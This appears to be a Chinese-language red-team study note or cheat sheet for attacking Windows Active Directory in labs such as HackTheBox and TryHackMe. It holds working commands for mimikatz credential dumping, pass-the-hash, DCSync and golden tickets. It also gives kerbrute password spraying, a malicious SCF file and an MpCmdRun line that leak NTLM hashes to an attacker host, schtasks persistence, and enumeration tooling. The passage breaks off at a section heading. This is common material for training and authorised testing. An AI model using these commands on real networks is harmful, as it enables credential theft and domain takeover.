class="headerlink" title="mimikatz"></a>mimikatz</h2><p>简单来说，它的核心功能就是<strong>从 Windows 内存（LSASS 进程）中提取密码、哈希（Hash）、PIN 码和 Kerberos 票据</strong>。<br>在执行任何涉及内存读取的命令（如抓密码）之前，<strong>必须</strong>先执行以下命令以获取调试权限，否则会报错。<code>privilege::debug</code></p><table><thead><tr><th><strong>模块&#x2F;命令</strong></th><th><strong>说明</strong></th><th><strong>攻击场景</strong></th></tr></thead><tbody><tr><td><strong><code>privilege::debug</code></strong></td><td>提升当前进程权限 (<code>SeDebugPrivilege</code>)</td><td><strong>起手式</strong>，必须最先执行。</td></tr><tr><td><strong><code>sekurlsa::logonpasswords</code></strong></td><td>抓取所有已登录用户的密码&#x2F;哈希</td><td><strong>最常用</strong>。尝试获取明文密码或 NTLM Hash。</td></tr><tr><td><strong><code>lsadump::sam</code></strong></td><td>读取本地 SAM 文件</td><td>获取本机所有用户的 NTLM Hash (类似 <code>hashdump</code>)。</td></tr><tr><td><strong><code>lsadump::lsa /patch</code></strong></td><td>读取域控上的 LSA 数据库</td><td><strong>仅在域控上使用</strong>，获取域内用户哈希。</td></tr><tr><td><strong><code>sekurlsa::pth</code></strong></td><td><strong>Pass-the-Hash (哈希传递)</strong></td><td>利用 NTLM Hash 启动一个新进程，用于横向移动。</td></tr><tr><td><strong><code>lsadump::dcsync</code></strong></td><td>模拟域控同步数据</td><td><strong>域霸主</strong>。远程导出域内任意用户的哈希 (如 krbtgt)。</td></tr><tr><td><strong><code>kerberos::list</code></strong></td><td>列出当前缓存的 Kerberos 票据</td><td>查看当前有哪些票据可用。</td></tr><tr><td><strong><code>exit</code></strong></td><td>退出 Mimikatz</td><td>这里的 <code>Ctrl+C</code> 不好使，得输命令退出。</td></tr><tr><td><code>sekurlsa::msv</code></td><td><strong>只抓哈希</strong>。</td><td>如果你确定抓不到明文（或者只想做 PtH），用这个命令输出更干净，更方便查看。</td></tr><tr><td><code>lsadump::secrets</code></td><td>读取 LSA Secrets。</td><td>可能抓到服务账号密码、计划任务密码等。</td></tr><tr><td><code>token::elevate</code></td><td><strong>令牌提权</strong>。将当前权限从 Admin 提升到 <strong>SYSTEM</strong>。</td><td>默认提升至 SYSTEM。也可加 <code>/id:PID</code> 窃取指定进程的令牌。</td></tr><tr><td><code>token::list</code></td><td>列出系统中的所有令牌</td><td>查看是否有域管理员的进程在跑，以便窃取。</td></tr><tr><td><code>token::revert</code></td><td>恢复到原本的令牌</td><td>变身结束后，变回原来的自己。</td></tr></tbody></table><table><thead><tr><th><strong><code>sekurlsa::tickets /export</code></strong></th><th><strong>导出票据</strong>。将内存中所有的 Kerberos 票据（TGT 和 ST）导出为磁盘上的 <code>.kirbi</code> 文件。</th><th><strong>Pass-the-Ticket (PtT) 准备阶段</strong>。当你无法破解密码哈希，但内存里有现成的票据时，先把它导出来保存。</th></tr></thead><tbody><tr><td><strong><code>kerberos::ptt &lt;文件名&gt;</code></strong></td><td><strong>票据传递 (Pass-the-Ticket)</strong>。将指定的 <code>.kirbi</code> 票据文件注入到当前会话中。</td><td><strong>横向移动执行阶段</strong>。注入偷来的（或伪造的黄金）票据，让当前会话拥有票据所属用户的权限，从而访问远程资源。</td></tr><tr><td><strong><code>sekurlsa::ekeys</code></strong></td><td><strong>抓取加密密钥</strong>。列出 Kerberos 相关的 AES128、AES256 和 RC4 (NTLM) 密钥。</td><td><strong>高级伪造&#x2F;备选方案</strong>。1. 当 <code>logonpasswords</code> 抓不到 NTLM 时，尝试抓 AES 密钥。2. 制作更隐蔽的<strong>黄金票据</strong>（使用 AES 密钥比使用 NTLM 更难被检测）。</td></tr></tbody></table><ol><li>抓内存密码：</li></ol><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonpasswords</span></span><br></pre></td></tr></table></figure></div><ol start="2"><li>Pass the hash<br>你只拿到了管理员的 NTLM Hash，解不开明文，但想用它登录远程机器。</li></ol><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::pth /user:Administrator /domain:THM.local /ntlm:&lt;NTLM_HASH_HERE&gt;</span><br></pre></td></tr></table></figure></div><p>会弹出一个新的 CMD 窗口。虽然在这个新窗口里 <code>whoami</code> 还是原用户，但当你访问网络资源（如 <code>dir \\TargetIP\c$</code>）时，使用的是管理员身份。<br>3. 导出域控hash<br>如果你已经有了域管理员权限，想在任何机器上（不需要登录域控）导出 <code>krbtgt</code> 的哈希来制作黄金票据</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:za.tryhackme.com /user:krbtgt</span></span><br></pre></td></tr></table></figure></div><h2 id="注册表的五大根键"><a href="#注册表的五大根键" class="headerlink" title="注册表的五大根键"></a>注册表的五大根键</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>根键 (缩写)</td><td>全称</td><td>主要作用</td></tr><tr><td><strong>HKCR</strong></td><td>HKEY_CLASSES_ROOT</td><td><strong>文件关联</strong>和 <strong>COM 对象</strong>注册。</td></tr><tr><td><strong>HKCU</strong></td><td>HKEY_CURRENT_USER</td><td><strong>当前登录用户</strong>的特定配置和个性化设置。</td></tr><tr><td><strong>HKLM</strong></td><td>HKEY_LOCAL_MACHINE</td><td><strong>计算机全局</strong>的硬件、软件和系统配置，对所有用户生效。</td></tr><tr><td><strong>HKU</strong></td><td>HKEY_USERS</td><td><strong>所有用户配置文件的容器</strong>，以用户 SID 作为子键。</td></tr><tr><td><strong>HKCC</strong></td><td>HKEY_CURRENT_CONFIG</td><td>系统启动时使用的<strong>当前硬件配置文件</strong>的信息。</td></tr></tbody></table><h2 id="kerbrute-–扫描域中有效用户"><a href="#kerbrute-–扫描域中有效用户" class="headerlink" title="kerbrute  –扫描域中有效用户"></a>kerbrute  –扫描域中有效用户</h2><p>主要用于通过 Kerberos 协议对 Active Directory (AD) 环境进行用户枚举和密码爆破。</p><table><thead><tr><th>指令 (Command)</th><th>功能描述</th><th>使用场景</th></tr></thead><tbody><tr><td>userenum</td><td><strong>用户枚举</strong>。通过发送不带预身份验证的 TGT 请求来判断用户名是否存在。如果域控制器返回“PRINCIPAL UNKNOWN”（主体未知）错误，则用户不存在；如果提示需要预身份验证，则证明用户存在。 <strong>此操作通常是安全的，不会导致账户锁定</strong>。</td><td>在不知道任何有效凭证的情况下，验证一个用户名列表（例如，从公开信息收集的员工姓名）的有效性。</td></tr><tr><td>passwordspray</td><td><strong>密码喷洒</strong>。使用一个或少数几个常见密码（如 Password123、Year2025!）去尝试登录一个庞大的用户列表。这种“横向”的攻击方式可以有效避免因对单一账户尝试次数过多而导致的账户锁定。</td><td>当你有一个确认有效的用户列表，并怀疑域内存在大量弱密码时使用。</td></tr><tr><td>bruteuser</td><td><strong>对单个用户进行密码爆破</strong>。针对一个已知的有效用户名，使用一个密码字典（wordlist）进行持续的密码尝试，直到找到正确的密码。 <strong>此操作风险很高，极易触发账户锁定策略</strong>。</td><td>当你锁定了一个高权限目标（如域管理员），并希望集中火力破解其密码时使用。</td></tr><tr><td>bruteforce</td><td><strong>组合爆破</strong>。从一个文件中读取“用户名:密码”格式的组合列表，并逐一进行验证。</td><td>当你从其他泄露的数据库中获得了一批用户名和密码组合，想在当前目标上“撞库”时使用。</td></tr><tr><td><code>./kerbrute username -d htb.local --dc htb.local  user_list</code></td><td></td><td></td></tr><tr><td>-d 域名  –dc ip地址</td><td></td><td></td></tr><tr><td>同时可以用nmap 中的脚本扫描<code>nmap -6 -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;htb.local&#39;,userdb=user.list htb.local</code></td><td></td><td></td></tr></tbody></table><h2 id="responser"><a href="#responser" class="headerlink" title="responser"></a>responser</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/256844.html">内网渗透之Responder攻防（上）</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/265246.html">内网渗透之Responder演练（下）</a><br>根据windows中的基本协议 得到ntlmv2&#x2F;v1 的hash值<br>如果是ntlmv1的hash值 要用彩虹表破解 在crack.sh网站上可以破解<br>为了不每次生成的hash是随机的 要在conf中指定challenge set 十六位的数字<br><a href="%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0.md#evil-winrm%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91">evil-winrm登录用户进行横向</a><br>.&#x2F;MpCmdRun.exe -Scan -scantype 3 -File \kali.ip\noexit 连接到kali 然responser获取hash</p><h2 id="scf文件"><a href="#scf文件" class="headerlink" title="scf文件"></a>scf文件</h2><p>SCF（Shell Command File）文件，即“Windows 资源管理器命令”文件，是一种特殊的文本文件，主要用于执行一组预定义的 Windows Shell 命令<br>它的功能与快捷方式（.lnk 文件）有些类似，通常用于执行一些简单的操作，例如显示桌面或打开特定的 Windows 资源管理器窗口。<br>攻击者会创建一个 .scf 文件，其内容指向一个由攻击者控制的远程服务器上的图标文件。 这个路径通常是一个 UNC（通用命名约定）路径，格式为 \attacker-server\share\icon.ico</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Shell]</span> </span><br><span class="line"><span class="attr">Command</span>=<span class="number">2</span> </span><br><span class="line"><span class="attr">IconFile</span>=\\攻击者的IP地址\share\test.ico </span><br><span class="line"><span class="section">[Taskbar]</span> </span><br><span class="line"><span class="attr">Command</span>=ToggleDesktop</span><br></pre></td></tr></table></figure></div><p>触发身份认证之后 可以用来获取ntlm的哈希<br>这里嗅探之后获取哈希 破解之后得到一个用户登录凭据<br>接着用winpeas 枚举信息   找到printer相关的信息<br>利用print nightmare漏洞提权</p><h2 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h2><p>xfreerdp 是一个开源的 RDP (Remote Desktop Protocol) 客户端，专门用于在 Linux (如 Kali) 上连接 Windows 远程桌面。<br><strong>主要端口</strong>: 默认 <strong>TCP 3389</strong>。<code>xfreerdp</code> 的参数格式比较特殊，通常使用 <code>/参数名:值</code> 的形式。</p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th><th><strong>备注</strong></th></tr></thead><tbody><tr><td><strong><code>/v:&lt;IP&gt;</code></strong></td><td><strong>Server</strong>。指定目标 IP 地址。</td><td>也可以写成 <code>/v:IP:Port</code>。</td></tr><tr><td><strong><code>/u:&lt;Username&gt;</code></strong></td><td><strong>User</strong>。指定用户名。</td><td></td></tr><tr><td><strong><code>/p:&lt;Password&gt;</code></strong></td><td><strong>Password</strong>。指定明文密码。</td><td></td></tr><tr><td><strong><code>/pth:&lt;Hash&gt;</code></strong></td><td><strong>Pass-the-Hash</strong>。指定 NTLM 哈希。</td><td><strong>核心功能</strong>。格式为 <code>LM:NTLM</code> 或直接 <code>NTLM</code>。</td></tr><tr><td><strong><code>/d:&lt;Domain&gt;</code></strong></td><td><strong>Domain</strong>。指定域名。</td><td>如果是本地账户，通常不需要加，或写点号 <code>.</code>。</td></tr><tr><td><strong><code>/cert:ignore</code></strong></td><td><strong>Certificate</strong>。忽略证书错误。</td><td><strong>必加参数</strong>。否则连接可能会因为自签名证书而失败。</td></tr><tr><td><strong><code>/dynamic-resolution</code></strong></td><td><strong>分辨率</strong>。允许动态调整窗口大小。</td><td>防止远程桌面窗口太小或太大，强烈推荐加上。</td></tr><tr><td><strong><code>/drive:share,/tmp</code></strong></td><td><strong>文件共享</strong>。将本地目录挂载到远程。</td><td>方便把 Kali 的工具（如木马、Mimikatz）传到 Windows 上。</td></tr><tr><td><strong><code>+clipboard</code></strong></td><td><strong>剪贴板</strong>。开启剪贴板共享。</td><td>允许你在 Kali 和 Windows 之间复制粘贴文本。</td></tr></tbody></table><h2 id="权限维持操作："><a href="#权限维持操作：" class="headerlink" title="权限维持操作："></a>权限维持操作：</h2><p><code>user username passwd. /add</code><br><code>net localgroup administrators username /add</code><br><code>impacket-secretdump &#39;username:passwd.&#39;@driver.htb</code> 拿到admin的哈希<br><code>nxc winrm driver.htb -u Administrator -H &#39;xxxx&#39; </code><br>在这个后面加上-X 也可以执行所有的操作</p><h4 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h4><p>用来创建计划任务的工具，常用于权限维持，用于横向移动也是可以<br><a href="THM-AD.md#Creating%20Scheduled%20Tasks%20Remotely">Creating Scheduled Tasks Remotely</a></p><table><thead><tr><th><strong>参数</strong></th><th><strong>说明</strong></th><th><strong>攻击者视角</strong></th></tr></thead><tbody><tr><td><strong><code>/s TARGET</code></strong></td><td>指定远程目标</td><td>必须拥有目标的管理员凭证。</td></tr><tr><td><strong><code>/create</code></strong></td><td>创建任务</td><td>埋入 Payload。</td></tr><tr><td><strong><code>/run</code></strong></td><td><strong>立即运行</strong></td><td>既然是横向移动，我们不想等，要立刻拿 Shell。</td></tr><tr><td><strong><code>/delete</code></strong></td><td>删除任务</td><td><strong>清理痕迹</strong> (OpSec)，非常重要。</td></tr><tr><td><strong><code>/query</code></strong></td><td>查询任务</td><td>检查任务是否创建成功。</td></tr><tr><td><strong><code>/RU SYSTEM</code></strong></td><td><strong>运行身份</strong></td><td><strong>提权关键</strong>。强制任务以最高权限运行，而不是当前用户权限。</td></tr><tr><td><strong><code>/sc ONCE</code></strong></td><td>计划频率</td><td>通常设置为“一次性”。</td></tr><tr><td><strong><code>/tn</code></strong></td><td>任务名称</td><td>建议起一个看起来像系统任务的名字（如 <code>UpdateService</code>）以混淆视听。</td></tr></tbody></table><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00 </span><br><span class="line"></span><br><span class="line">schtasks /s TARGET /run /TN &quot;THMtask1&quot; </span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F</span><br></pre></td></tr></table></figure></div><h2 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h2><p>Nishang是一款针对PowerShell的渗透工具。它基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种payload，包括了下载和执行、键盘记录、DNS、延时命令等脚本。<br><code>Nishang</code> 需要 Powershell 版本在 <code>v3</code> 以上才能使用<br><img src="/Windows%E7%9F%A5%E8%AF%86.assets/image-20251016193419041.png"><br><code>windows10</code> 需要关闭<code>Windows Defender</code>防病毒程序，才能导入<code>nishang.psm1</code><br>运行命令<code>Set-ExecutionPolicy Unrestricted</code>，修改为最高权限，可以执行任意脚本。<br>powershell有六种执行策略：<br>Unrestricted 权限最高，可以不受限制执行任意脚本<br>Restricted 默认策略，不允许任意脚本的执行<br>allSigned 所有脚本必须经过签名运行<br>RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名<br>Bypass 没有任何限制和提示<br>Undefined 没有设置脚本的策略<code> 以上三个准备工作弄好了之后，运行命令</code>Import-Module -verbose .\nishang.psm1<code>就可以愉快的导入</code>Nishang&#96;模块了。<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/F5s_XYsQcbrJygtwnu33FA">https://mp.weixin.qq.com/s/F5s_XYsQcbrJygtwnu33FA</a></p>
+<h1 id="阶段-0：目标发现与服务识别"><a href="#阶段-0：目标发现与服务识别" class="headerlink" title="阶段 0：目标发现与服务识别"></a>阶段 0：目标发现与服务识别</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>常见攻击场景：</p>
+<ol>
+<li>初始踩点识别 DC 与域成员主机。</li>
+<li>确认 SMB&#x2F;LDAP&#x2F;Kerberos&#x2F;WinRM&#x2F;RDP 是否开放。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-sC</code>：运行默认 NSE 脚本，快速获取服务信息。</li>
+<li><code>-sV</code>：识别服务版本。</li>
+<li><code>-p-</code>：扫描全部 TCP 端口。</li>
+<li><code>-Pn</code>：跳过主机发现，目标禁 ping 时常用。</li>
+<li><code>-oA &lt;name&gt;</code>：同时输出 <code>nmap/gnmap/xml</code>。</li>
+<li><code>--min-rate &lt;num&gt;</code>：提高最小发包速率，提速但更吵。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,5985,3389 10.10.10.10 -oA dc_scan</span><br><span class="line">nmap -p- -Pn --min-rate 8000 10.10.10.0/24 -oA full_tcp</span><br></pre></td></tr></table></figure></div>
 
+<h1 id="阶段-1：匿名-低权限信息枚举"><a href="#阶段-1：匿名-低权限信息枚举" class="headerlink" title="阶段 1：匿名&#x2F;低权限信息枚举"></a>阶段 1：匿名&#x2F;低权限信息枚举</h1><h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><p>常见攻击场景：</p>
+<ol>
+<li>匿名或低权限访问 <code>SYSVOL/NETLOGON</code>。</li>
+<li>下载 GPP 等配置文件，提取潜在凭据。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-L //host</code>：列共享。</li>
+<li><code>-N</code>：空口令连接。</li>
+<li><code>-U user%pass</code>：指定用户名密码。</li>
+<li><code>-I &lt;IP&gt;</code>：指定目标 IP（DNS 解析异常时好用）。</li>
+<li><code>-c &#39;&lt;command&gt;&#39;</code>：非交互执行命令。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.100 -N</span><br><span class="line">smbclient -L //10.10.10.100 -U <span class="string">&quot;SVC_TGS%GPPstillStandingStrong2k18&quot;</span></span><br><span class="line">smbclient //10.10.10.100/SYSVOL -U <span class="string">&quot;corp.local/jerry%Summer2025!&quot;</span> -c <span class="string">&#x27;recurse;prompt OFF;ls&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><p>常见攻击场景：</p>
+<ol>
+<li>快速查看共享目录可读&#x2F;可写权限。</li>
+<li>递归列目录、下载或上传文件。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-H &lt;IP&gt;</code>：目标主机。</li>
+<li><code>-u/-p</code>：用户名和密码。</li>
+<li><code>-d &lt;domain&gt;</code>：域名。</li>
+<li><code>-R</code>：递归列目录。</li>
+<li><code>-A &lt;regex&gt;</code>：下载匹配文件。</li>
+<li><code>--download &lt;path&gt;</code>：下载远程文件。</li>
+<li><code>--upload &lt;src&gt; &lt;dst&gt;</code>：上传文件。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -d active.htb -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line">smbmap -H 10.10.10.100 -u jerry -p <span class="string">&#x27;Summer2025!&#x27;</span> -R</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="enum4linux-ng-enum4linux"><a href="#enum4linux-ng-enum4linux" class="headerlink" title="enum4linux-ng &#x2F; enum4linux"></a>enum4linux-ng &#x2F; enum4linux</h2><p>常见攻击场景：</p>
+<ol>
+<li>SMB 面快速全量枚举用户、组、共享、策略。</li>
+<li>喷洒前先确认密码策略。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-A/-a</code>：全量枚举。</li>
+<li><code>-U</code>：枚举用户。</li>
+<li><code>-G</code>：枚举组。</li>
+<li><code>-S</code>：枚举共享。</li>
+<li><code>-P</code>：读取密码策略。</li>
+<li><code>-u/-p</code>：带凭据枚举。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 10.10.10.10</span><br><span class="line">enum4linux -u guest -p <span class="string">&#x27;&#x27;</span> -U -S -P 10.10.10.10</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><p>常见攻击场景：</p>
+<ol>
+<li>匿名&#x2F;低权枚举域用户、域组、SID。</li>
+<li>与 SMB&#x2F;LDAP 枚举结果交叉验证。</li>
+</ol>
+<p>常用参数与交互命令（含解释）：</p>
+<ul>
+<li><code>-U &lt;user&gt;</code>：用户名（空用户可匿名尝试）。</li>
+<li><code>-N</code>：不提示密码。</li>
+<li><code>enumdomusers</code>：枚举域用户。</li>
+<li><code>enumdomgroups</code>：枚举域组。</li>
+<li><code>queryuser &lt;rid&gt;</code>：查看用户详情。</li>
+<li><code>lsaquery</code>：查询域 SID。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U <span class="string">&#x27;&#x27;</span> -N 10.10.10.10</span><br><span class="line"><span class="comment"># enumdomusers</span></span><br><span class="line"><span class="comment"># enumdomgroups</span></span><br><span class="line"><span class="comment"># queryuser 0x1f4</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h2><p>常见攻击场景：</p>
+<ol>
+<li>枚举用户、组、计算机对象。</li>
+<li>查询 SPN 用户，为 Kerberoast 准备目标。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-x</code>：简单认证。</li>
+<li><code>-H ldap://&lt;ip&gt;</code>：LDAP 服务地址。</li>
+<li><code>-D &lt;bind_dn&gt;</code>：绑定账户。</li>
+<li><code>-w &lt;pass&gt;</code>：绑定密码。</li>
+<li><code>-b &lt;base_dn&gt;</code>：查询基准 DN。</li>
+<li><code>&#39;(filter)&#39;</code>：查询过滤器。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.10.10 -D <span class="string">&#x27;corp\\jerry&#x27;</span> -w <span class="string">&#x27;Summer2025!&#x27;</span> -b <span class="string">&#x27;DC=corp,DC=local&#x27;</span> <span class="string">&#x27;(objectClass=user)&#x27;</span> sAMAccountName memberOf</span><br><span class="line">ldapsearch -x -H ldap://10.10.10.10 -D <span class="string">&#x27;corp\\jerry&#x27;</span> -w <span class="string">&#x27;Summer2025!&#x27;</span> -b <span class="string">&#x27;DC=corp,DC=local&#x27;</span> <span class="string">&#x27;(&amp;(objectClass=user)(servicePrincipalName=*))&#x27;</span> sAMAccountName servicePrincipalName</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="GetADUsers-py（Impacket）"><a href="#GetADUsers-py（Impacket）" class="headerlink" title="GetADUsers.py（Impacket）"></a>GetADUsers.py（Impacket）</h2><p>常见攻击场景：</p>
+<ol>
+<li>拿到一组域凭据后快速枚举域用户属性。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-all</code>：输出更多属性（描述&#x2F;邮箱&#x2F;时间等）。</li>
+<li><code>-dc-ip &lt;IP&gt;</code>：指定域控 IP。</li>
+<li><code>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</code>：认证格式。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="BloodHound-SharpHound"><a href="#BloodHound-SharpHound" class="headerlink" title="BloodHound + SharpHound"></a>BloodHound + SharpHound</h2><p>常见攻击场景：</p>
+<ol>
+<li>找“当前权限 -&gt; 域管”的最短路径。</li>
+<li>分析 ACL、会话、委派、信任关系。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-c All</code>：全量收集。</li>
+<li><code>-d &lt;domain&gt;</code>：指定域。</li>
+<li><code>--domaincontroller &lt;IP&gt;</code>：指定 DC。</li>
+<li><code>--zip</code> &#x2F; <code>--zipfilename</code>：打包结果导入 BloodHound。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe <span class="literal">-d</span> active.htb <span class="literal">-c</span> All <span class="literal">--domaincontroller</span> <span class="number">10.10</span>.<span class="number">10.100</span> <span class="literal">--zip</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="阶段-2：账号发现与认证攻击"><a href="#阶段-2：账号发现与认证攻击" class="headerlink" title="阶段 2：账号发现与认证攻击"></a>阶段 2：账号发现与认证攻击</h1><h2 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h2><p>常见攻击场景：</p>
+<ol>
+<li>用户名有效性枚举。</li>
+<li>密码喷洒。</li>
+</ol>
+<p>常用子命令&#x2F;参数（含解释）：</p>
+<ul>
+<li><code>userenum</code>：用户枚举。</li>
+<li><code>passwordspray</code>：密码喷洒。</li>
+<li><code>bruteuser</code>：单用户爆破（高风险）。</li>
+<li><code>bruteforce</code>：组合爆破。</li>
+<li><code>-d &lt;domain&gt;</code>：域名。</li>
+<li><code>--dc &lt;IP&gt;</code>：域控。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt</span><br><span class="line">kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt <span class="string">&#x27;Winter2025!&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="GetNPUsers-py（AS-REP-Roast）"><a href="#GetNPUsers-py（AS-REP-Roast）" class="headerlink" title="GetNPUsers.py（AS-REP Roast）"></a>GetNPUsers.py（AS-REP Roast）</h2><p>常见攻击场景：</p>
+<ol>
+<li>获取无预认证用户的 AS-REP hash 离线破解。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-usersfile &lt;file&gt;</code>：用户列表。</li>
+<li><code>-format hashcat</code>：输出 hashcat 格式。</li>
+<li><code>-outputfile &lt;file&gt;</code>：保存结果。</li>
+<li><code>-dc-ip &lt;IP&gt;</code>：指定 DC。</li>
+</ul>
+<p>示例：</p>
